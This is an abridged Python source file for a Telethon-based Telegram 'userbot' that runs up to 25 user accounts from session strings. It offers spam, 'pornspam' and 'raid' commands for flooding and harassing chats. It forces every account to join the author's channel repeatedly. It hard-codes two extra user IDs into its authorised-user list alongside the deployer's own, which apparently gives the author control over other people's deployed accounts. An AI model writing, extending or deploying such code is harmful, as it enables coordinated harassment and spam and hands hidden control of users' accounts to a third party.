...
from Config import STRING, SUDO, ALIVE_IMAGE, API_ID, API_HASH, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12 , STRING13 , STRING14 , STRING15 ,STRING16 , STRING17 , STRING18 , STRING19 , STRING20 , STRING21 , STRING22 , STRING23 , STRING24 , STRING25 
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Utils import RAID, RRAID, MRAID, SRAID, JRAID, CRAID
...
SMEX_USERS = [5244790377, 5269906172]
for x in SUDO: 
    SMEX_USERS.append(x)
...
async def start_yukki():
    ...
    if smexx:
        ...
        try:
            ...
            await ydk.start()
            await ydk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ydk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ydk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ydk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if smexxx:
        ...
        try:
            ...
            await  wdk.start()
            await wdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await wdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await wdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await wdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if smexxxx:
        ...
        try:
            ...
            await hdk.start()
            await hdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await hdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await hdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await hdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if smexxxxx:
        ...
        try:
            ...
            await sdk.start()
            await sdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await sdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await sdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await sdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if sixth:
        ...
        try:
            ...
            await adk.start()
            await adk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await adk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await adk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await adk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if seven:
        ...
        try:
            ...
            await bdk.start()
            await bdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await bdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await bdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await bdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if eight:
        ...
        try:
            ...
            await cdk.start()
            await cdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await cdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await cdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await cdk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if ninth:
        ...
        try:
            ...
            await ddk.start()
            await ddk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ddk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ddk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ddk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if tenth:
        ...
        try:
            ...
            await edk.start()
            await edk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await edk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await edk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await edk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if eleve:
        ...
        try:
            ...
            await vkk.start()
            await vkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await vkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await vkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await vkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if twelv:
        ...
        try:
            ...
            await kkk.start()
            await kkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await kkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await kkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await kkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if thirt:
        ...
        try:
            ...
            await lkk.start()
            await lkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await lkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await lkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await lkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if forte:
        ...
        try:
            ...
            await mkk.start()
            await mkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await mkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await mkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await mkk(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if fifth:
        ...
        try:
            ...
            await sid.start()
            await sid(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await sid(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await sid(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await sid(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
    ...
    if sieee:
        ...
        try:
            ...
            await shy(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await shy(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await shy(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await shy(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if seeee:
        ...
        try:
            ...
            await aan(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await aan(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await aan(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await aan(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if eieee:
        ...
        try:
            ...
            await ake(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ake(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ake(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await ake(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if nieee:
        ...
        try:
            ...
            await eel(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await eel(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await eel(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await eel(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if gandu:
        ...
        try:
            ...
            await khu(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await khu(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await khu(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await khu(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if ekish:
        ...
        try:
            ...
            await shi(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await shi(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await shi(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await shi(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if baish:
        ...
        try:
            ...
            await yaa(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await yaa(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await yaa(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await yaa(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if teish:
        ...
        try:
            ...
            await dav(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await dav(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await dav(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await dav(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if tfour:
        ...
        try:
            ...
            await raj(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await raj(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await raj(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await raj(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
    ...
    if tfive:
        ...
        try:
            ...
            await put(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await put(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await put(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            await put(functions.channels.JoinChannelRequest(channel="@Bhaukaal_Bolte"))
            botid = telethon.utils.get_peer_id(botme)
...
async def _(e):
    ...
    if e.sender_id in SMEX_USERS:
        ...
        if len(e.text) > 7:
            bc = yukki[0]
            text = "🇭 ᗩᕼᗩᕼᗩᕼᗩ 🇵 ᖇIᐯᗩTᗴ 🇲 ᗴ 🇨 ᕼᑌᗪᗴᘜI 🇦 ᒍᒍ ❤️‍🔥"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
...
async def _(e):
    ...
    if e.sender_id in SMEX_USERS:
        ...
        if len(e.text) > 7:
            bc = ustad[0]
            bc = int(bc)
            text = "LEAVE KAR RA HU RUK JA BE !!"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
...
USTAD_PIC = "https://te.legra.ph/file/c12537f607fc2d4028946.jpg"
...
async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "RUK JA KAR RAHA HU PING PONG !!"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
...
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = "𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀\n\n𝙐𝙩𝙞𝙡𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.ping\n.restart\n\n𝙐𝙨𝙚𝙧𝙗𝙤𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.bio\n.join\n.pjoin\n.leave\n\n𝙎𝙥𝙖𝙢 𝘾𝙤𝙢𝙢𝙖𝙣𝙙:\n.spam\n.pornspam\n.delayspam\n.bigspam\n.raid\n.mraid\n.sraid\n.jraid\n.craid\n.replyraid\n.dreplyraid\n\n\n𝐹𝑂𝑅 𝑀𝑂𝑅𝐸 𝐻𝐸𝐿𝑃 𝑅𝐸𝐺𝐴𝑅𝐷𝐼𝑁𝐺 𝑈𝑆𝐴𝐺𝐸 𝑂𝐹 𝑃𝐿𝑈𝐺𝐼𝑁𝑆 𝑇𝑌𝑃𝐸 𝑃𝐿𝑈𝐺𝐼𝑁𝑆 𝑁𝐴𝑀𝐸 TO JOIN @Bhaukaal_Bolte"
       await e.reply(text, parse_mode=None, link_preview=None )

        

print("SUCCESSFULLY DEPLOYED BHAUKAAL BABA !!")
